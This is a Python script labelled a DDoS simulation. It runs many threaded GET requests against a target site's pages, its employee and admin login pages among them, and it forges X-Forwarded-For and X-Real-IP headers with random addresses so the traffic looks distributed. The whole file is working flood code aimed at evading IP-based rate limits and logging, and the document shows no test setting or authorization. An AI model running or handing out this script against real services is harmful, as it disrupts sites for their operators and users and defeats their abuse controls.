#!/usr/bin/env python3
"""
DDoS Simulation - With IP Spoofing
"""

import requests
import threading
import time
import random
from datetime import datetime
from colorama import Fore, Style

class DDOSAttack:
    def __init__(self, target_url):
        self.target_url = target_url
        self.endpoints = [
            "/",
            "/about",
            "/services",
            "/contact",
            "/auth/employee-login",
            "/auth/admin-login",
            "/files/"
        ]
        self.results = []
        self.successful_requests = 0
        self.failed_requests = 0
        
        # Generate random IPs for spoofing
        self.generate_fake_ips(100)
    
    def generate_fake_ips(self, count):
        """Generate fake IP addresses to simulate distributed attack"""
        self.fake_ips = []
        for _ in range(count):
            ip = f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
            self.fake_ips.append(ip)
    
    def make_request(self, endpoint, delay=0):
        """Make a request with spoofed IP"""
        try:
            time.sleep(delay)
            url = f"{self.target_url}{endpoint}"
            
            
            spoofed_ip = random.choice(self.fake_ips)
            
            response = requests.get(
                url,
                timeout=3,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                    'X-Forwarded-For': spoofed_ip,  # Spoof the IP!
                    'X-Real-IP': spoofed_ip
                }
            )
            
            if response.status_code == 200:
                self.successful_requests += 1
                status = "SUCCESS"
                color = Fore.GREEN
            else:
                self.failed_requests += 1
                status = f"FAILED ({response.status_code})"
                color = Fore.RED
            
            print(f"{color}[+] {endpoint} - {status} (IP: {spoofed_ip})")
            
            self.results.append({
                'endpoint': endpoint,
                'status_code': response.status_code,
                'status': status,
                'spoofed_ip': spoofed_ip,
                'timestamp': datetime.now().isoformat()
            })
            
        except Exception as e:
            self.failed_requests += 1
            print(Fore.RED + f"[-] {endpoint} - ERROR: {str(e)[:50]}")
    
    def worker(self, endpoint, requests_count, delay):
        """Worker thread function"""
        for _ in range(requests_count):
            self.make_request(endpoint, delay)
    
    def execute(self, requests=200, threads=10, delay=0.05):
        """Execute DDoS attack with IP spoofing"""
        print(Fore.RED + f"\n[+] Starting DDoS Attack (Distributed)")
        print(Fore.RED + f"    Target: {self.target_url}")
        print(Fore.RED + f"    Requests: {requests}")
        print(Fore.RED + f"    Threads: {threads}")
        print(Fore.RED + f"    Delay: {delay}s")
        print(Fore.RED + f"    Spoofed IPs: {len(self.fake_ips)}\n")
        
        start_time = time.time()
        
        # Distribute requests across threads
        requests_per_thread = requests // threads
        remaining = requests % threads
        
        thread_list = []
        
        for i in range(threads):
            endpoint = random.choice(self.endpoints)
            count = requests_per_thread + (1 if i < remaining else 0)
            
            thread = threading.Thread(
                target=self.worker,
                args=(endpoint, count, delay)
            )
            thread_list.append(thread)
            thread.start()
        
        
        for thread in thread_list:
            thread.join()
        
        elapsed = time.time() - start_time
        
        print(Fore.CYAN + f"\n[+] Attack completed in {elapsed:.2f} seconds")
        print(Fore.CYAN + f"[+] Successful requests: {self.successful_requests}")
        print(Fore.CYAN + f"[+] Failed requests: {self.failed_requests}")
        print(Fore.CYAN + f"[+] Unique IPs used: {len(self.fake_ips)}")
        print(Fore.CYAN + f"[+] Total: {self.successful_requests + self.failed_requests}")
        
        return {
            'successful': self.successful_requests,
            'failed': self.failed_requests,
            'unique_ips': len(self.fake_ips),
            'elapsed': elapsed,
            'results': self.results
        }
    